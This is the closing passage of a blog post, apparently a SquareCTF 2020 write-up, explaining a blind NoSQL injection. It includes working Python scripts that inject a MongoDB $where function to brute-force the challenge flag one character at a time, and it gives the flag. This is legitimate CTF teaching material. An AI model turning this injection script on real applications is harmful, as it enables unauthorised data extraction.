+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://challenges.2020.squarectf.com:9541/&#39;</span>,
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Construct our NoSQLi query</span>
+</span></span><span style="display:flex;"><span>  params <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>      (<span style="color:#e6db74">&#39;$where&#39;</span>, <span style="color:#e6db74">&#39;function(){if (this.flag!=undefined){return this.flag.includes(&#39;</span> <span style="color:#f92672">+</span> param <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)}else{return false}}&#39;</span>),
+</span></span><span style="display:flex;"><span>      )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://challenges.2020.squarectf.com:9542/api/posts&#39;</span>, headers<span style="color:#f92672">=</span>headers, params<span style="color:#f92672">=</span>params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The alphabet we&#39;re trying</span>
+</span></span><span style="display:flex;"><span>alpha<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">_-ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will contain the characters in the flag</span>
+</span></span><span style="display:flex;"><span>flag_chars<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> alpha:
+</span></span><span style="display:flex;"><span>  mystr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;&#34;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;trying: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(mystr))
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> req(mystr)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The response is a JSON array</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If the flag contains the substring, the response will have a length of 1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Otherwise, it will have a length of zero</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(resp) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># The the length of the response is more than zero, the flag contains this character</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># So append it to the list of characters</span>
+</span></span><span style="display:flex;"><span>      flag_chars <span style="color:#f92672">+=</span> i
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;Alphabet: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(flag_chars))
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">continue</span>
+</span></span></code></pre></div><p>This gives us the flag alphabet!</p>
+<pre tabindex="0"><code>Alphabet: afglnsu0{}LQSV
+</code></pre><h2 id="disclosing-the-flag">Disclosing the Flag</h2>
+<p>Now we can adapt the same script from above to bruteforce our flag. Heres the new variant (the <code>req</code> function is the same as earlier):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># We know for sure that the flag starts with &#39;flag{&#39;</span>
+</span></span><span style="display:flex;"><span>initstr<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flag{&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The alphabet of the flag that we found earlier</span>
+</span></span><span style="display:flex;"><span>alpha<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;afglnsu0</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">LQSV&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> i<span style="color:#f92672">&lt;</span>len(alpha):
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Construct our test substring for the flag</span>
+</span></span><span style="display:flex;"><span>  mystr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;&#34;</span> <span style="color:#f92672">+</span> initstr <span style="color:#f92672">+</span> alpha[i] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;trying: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(mystr))
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> req(mystr)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(resp) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># If the length of the response is non-zero, this is a valid substring</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># So we append it to the initial string and consider it a part of the flag</span>
+</span></span><span style="display:flex;"><span>      initstr <span style="color:#f92672">+=</span> alpha[i]
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Now that we have found one more character, we must iterate over the alphabet again</span>
+</span></span><span style="display:flex;"><span>      i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;Flag: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(initstr))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># Move on to the next character</span>
+</span></span><span style="display:flex;"><span>      i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Move on to the next character</span>
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>This script will slowly figure out the flag character by character based on the application response (it will give you an extra character which you can ignore). In a sense, this could be called a Blind NoSQLi injection attack because though we don&rsquo;t directly get the response from the DB (i.e. the flag), we are able to infer it based on the application response to our injected queries.</p>
+<p>The flag is <code>flag{n0SQLn0Vulns}</code>!</p>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>This was quite a fun challenge to solve, especially because just finding the NoSQLi vulnerability wasn&rsquo;t the end of the story, and how the whole Blind NoSQLi vulnerability was structured. The challenge also drives home the important lesson that NoSQL DBs are not free from injection vulnerabilities!</p>
+<h2 id="nosqli-resources">NoSQLi Resources</h2>
+<p>A <em>very</em> small collection of useful resources for NoSQLi that I found while solving this challenge:</p>
+<ol>
+<li><a href="https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf" title="OWASP NoSQLi">A quick intro to NoSQLi from OWASP</a></li>
+<li><a href="https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/" title="Code Injection in MongoDB">Code Injection in MongoDB</a></li>
+<li><a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt" title="NoSQLi Wordlist">NoSQLi Wordlist</a></li>
+</ol>
+        </p>
+    </div>
+    
+
+    
+
+    <div class="page-footer">
+        
+        <hr class="footer-divider">
+        
+            <a class="tag" href="/tags/security">#security</a>
+        
+            <a class="tag" href="/tags/web-security">#web security</a>
+        
+            <a class="tag" href="/tags/nosql-injection">#nosql injection</a>
+        
+            <a class="tag" href="/tags/squarectf-2020">#squarectf 2020</a>
+        
+      
+    </div>
+
+
+        
+        </div>
+        <footer class="footer-mobile">
+	<div class="social-icons">
+        
+    <a class="social-icon" href="mailto:ajmalsiddiqui21@gmail.com" target="_blank" rel="noopener" title="Email">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M25.2794292,5.59128519 L14,16.8707144 L2.72057081,5.59128519 C3.06733103,5.30237414 3.51336915,5.12857603 4,5.12857603 L24,5.12857603 C24.4866308,5.12857603 24.932669,5.30237414 25.2794292,5.59128519 Z M25.9956978,6.99633695 C25.998551,7.04004843 26,7.08414302 26,7.12857603 L26,20.871424 C26,21.0798433 25.9681197,21.2808166 25.9089697,21.4697335 L18.7156355,14.2763993 L25.9956978,6.99633695 Z M24.9498374,22.6319215 C24.6672737,22.7846939 24.3437653,22.871424 24,22.871424 L4,22.871424 C3.5268522,22.871424 3.09207889,22.7071233 2.74962118,22.432463 L10.0950247,15.0870594 L13.9848068,18.9768415 L14.1878486,18.7737996 L14.2030419,18.7889929 L17.6549753,15.3370594 L24.9498374,22.6319215 Z M2.00810114,21.0526627 C2.00273908,20.9929669 2,20.9325153 2,20.871424 L2,7.12857603 C2,7.08414302 2.00144896,7.04004843 2.00430222,6.99633695 L9.03436454,14.0263993 L2.00810114,21.0526627 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+    <a class="social-icon" href="https://twitter.com/_ajmalsiddiqui" target="_blank" rel="noopener" title="Twitter">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M8.991284,24.971612 C19.180436,24.971612 24.752372,16.530224 24.752372,9.210524 C24.752372,8.970656 24.747512,8.731868 24.736496,8.494376 C25.818008,7.712564 26.758256,6.737 27.5,5.62622 C26.507372,6.067076 25.439252,6.364292 24.318752,6.498212 C25.462472,5.812628 26.340512,4.727444 26.754584,3.434036 C25.684088,4.068536 24.499004,4.53002 23.23724,4.778528 C22.226468,3.701876 20.786828,3.028388 19.193828,3.028388 C16.134404,3.028388 13.653536,5.509256 13.653536,8.567492 C13.653536,9.0023 13.702244,9.424904 13.797176,9.830552 C9.19346,9.599108 5.11106,7.39472 2.3792,4.04294 C1.903028,4.861364 1.629032,5.812628 1.629032,6.827072 C1.629032,8.74904 2.606972,10.445612 4.094024,11.438132 C3.185528,11.41016 2.331788,11.160464 1.585184,10.745096 C1.583888,10.768208 1.583888,10.791428 1.583888,10.815728 C1.583888,13.49888 3.493652,15.738584 6.028088,16.246508 C5.562932,16.373084 5.07326,16.44134 4.56782,16.44134 C4.210988,16.44134 3.863876,16.406024 3.526484,16.34144 C4.231724,18.542264 6.276596,20.143796 8.701412,20.18894 C6.805148,21.674696 4.416836,22.56008 1.821488,22.56008 C1.374476,22.56008 0.93362,22.534592 0.5,22.4834 C2.951708,24.054476 5.862524,24.971612 8.991284,24.971612"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <a class="social-icon" href="https://linkedin.com/in/ajmal-siddiqui" target="_blank" rel="noopener" title="LinkedIn">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M2,3.654102 C2,2.69908141 2.79442509,1.92397846 3.77383592,1.92397846 L24.2261641,1.92397846 C25.2058917,1.92397846 26,2.69908141 26,3.654102 L26,24.3462148 C26,25.3015521 25.2058917,26.0760215 24.2261641,26.0760215 L3.77383592,26.0760215 C2.79442509,26.0760215 2,25.3015521 2,24.3465315 L2,3.65378524 L2,3.654102 Z M9.27526132,22.1415901 L9.27526132,11.2356668 L5.65030092,11.2356668 L5.65030092,22.1415901 L9.27557808,22.1415901 L9.27526132,22.1415901 Z M7.46341463,9.74691162 C8.72727273,9.74691162 9.51409566,8.90940767 9.51409566,7.86284447 C9.49033893,6.79252455 8.72727273,5.97846056 7.48748812,5.97846056 C6.24675325,5.97846056 5.43649034,6.79252455 5.43649034,7.86284447 C5.43649034,8.90940767 6.22299652,9.74691162 7.4396579,9.74691162 L7.46309788,9.74691162 L7.46341463,9.74691162 Z M11.2815965,22.1415901 L14.9062401,22.1415901 L14.9062401,16.0519481 C14.9062401,15.7263225 14.9299968,15.4000634 15.0256573,15.1675641 C15.2876148,14.5159962 15.8840672,13.8416218 16.8856509,13.8416218 C18.1970225,13.8416218 18.7218879,14.8416218 18.7218879,16.3078872 L18.7218879,22.1415901 L22.3465315,22.1415901 L22.3465315,15.8885017 C22.3465315,12.5388027 20.5584416,10.9800443 18.1735825,10.9800443 C16.2182452,10.9800443 15.3595185,12.072854 14.8824834,12.8172315 L14.9065569,12.8172315 L14.9065569,11.2359835 L11.2819132,11.2359835 C11.3291099,12.2591067 11.2815965,22.1419069 11.2815965,22.1419069 L11.2815965,22.1415901 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+    <a class="social-icon" href="https://medium.com/@ajmalsiddiqui21" target="_blank" rel="noopener" title="Medium">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M2,2 L26,2 L26,26 L2,26 L2,2 Z M7.72727142,10.0265545 L7.72727142,17.1527156 C7.77112416,17.4097828 7.69008764,17.6723786 7.50898513,17.8600642 L5.81538462,19.9143852 L5.81538462,20.1852847 L10.617683,20.1852847 L10.617683,19.9143852 L8.92408245,17.8600642 C8.74165168,17.6726892 8.65559727,17.4118239 8.69074193,17.1527156 L8.69074193,10.9897526 L12.9059255,20.1852847 L13.3951878,20.1852847 L17.0157294,10.9897526 L17.0157294,18.3190884 C17.0157294,18.514738 17.0157294,18.5523628 16.8877685,18.6802876 L15.5855778,19.9444852 L15.5855778,20.2153846 L21.9083531,20.2153846 L21.9083531,19.9444852 L20.6513252,18.7103876 C20.5403599,18.6258033 20.4853154,18.4867833 20.50831,18.3491883 L20.50831,9.28158097 C20.4853154,9.14398599 20.5403599,9.00496587 20.6513252,8.92038167 L21.9384615,7.68628409 L21.9384615,7.41538462 L17.4824105,7.41538462 L14.3059685,15.3391941 L10.6929541,7.41538462 L6.01861668,7.41538462 L6.01861668,7.68628409 L7.52403936,9.49980554 C7.67182769,9.63301305 7.74730311,9.82863473 7.72727142,10.0265545 Z"></path>
+        </svg>
+    </a>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <a class="social-icon" href="https://github.com/ajmalsiddiqui" target="_blank" rel="noopener" title="GitHub">
+        <svg width="28px" height="28px" viewBox="0 0 28 28" version="1.1" fill="#ABABAB" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink">
+            <path d="M13.9988029,1.32087331 C6.82105037,1.32087331 1,7.14112562 1,14.3212723 C1,20.0649109 4.72454649,24.9370678 9.89038951,26.6560892 C10.5408085,26.7757983 10.7778323,26.374374 10.7778323,26.0296121 C10.7778323,25.7215609 10.7666595,24.9035493 10.760275,23.8189856 C7.14426471,24.6042767 6.38131925,22.0760223 6.38131925,22.0760223 C5.78995672,20.5740732 4.93762853,20.1742451 4.93762853,20.1742451 C3.75729765,19.3682044 5.02701126,19.3841656 5.02701126,19.3841656 C6.33183953,19.4759425 7.01817121,20.7241085 7.01817121,20.7241085 C8.17775254,22.7104801 10.0611744,22.1366749 10.8017741,21.8038838 C10.919887,20.9643246 11.2558703,20.3913175 11.6269683,20.066507 C8.74038491,19.7385043 5.70536235,18.6228163 5.70536235,13.6413251 C5.70536235,12.2223743 6.21213051,11.0611968 7.04370914,10.1530044 C6.90963504,9.82420367 6.46351945,8.50181809 7.17139875,6.71256734 C7.17139875,6.71256734 8.26234691,6.36301702 10.7459099,8.04532771 C11.78259,7.75642995 12.8950858,7.61277914 14.000399,7.60719272 C15.1049142,7.61277914 16.2166119,7.75642995 17.2548881,8.04532771 C19.736855,6.36301702 20.8262071,6.71256734 20.8262071,6.71256734 C21.5356825,8.50181809 21.0895669,9.82420367 20.9562909,10.1530044 C21.7894656,11.0611968 22.2922435,12.2223743 22.2922435,13.6413251 C22.2922435,18.6355852 19.2524325,19.734514 16.3570705,20.0561322 C16.8231376,20.4575564 17.2389269,21.2508282 17.2389269,22.4638795 C17.2389269,24.2012564 17.2229657,25.603448 17.2229657,26.0296121 C17.2229657,26.3775663 17.4575954,26.7821827 18.116793,26.6552912 C23.2786458,24.9322794 27,20.0633148 27,14.3212723 C27,7.14112562 21.1789496,1.32087331 13.9988029,1.32087331"></path>
+        </svg>
+    </a>
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+</div>
+
+
+
+
+	<div class="footer-mobile-links">
+        <p><a href="https://github.com/kimcc/hugo-theme-noteworthy" target="_blank" rel="noopener">Noteworthy theme</a></p>
+		<span class="divider-bar">|</span>
+        <p><a href="https://gohugo.io" target="_blank" rel="noopener">Built with Hugo</a></p>
+	</div>
+
+	<script src="/js/main.min.a7205ef73b078c8daed6fe1b0826e8ba229ffabbb69d299d9446cf41f2c7d8aa.js" integrity="sha256-pyBe9zsHjI2u1v4bCCbouiKf+ru2nSmdlEbPQfLH2Ko=" crossorigin="anonymous"></script>
+</footer>
+
+    </body>
+</html>
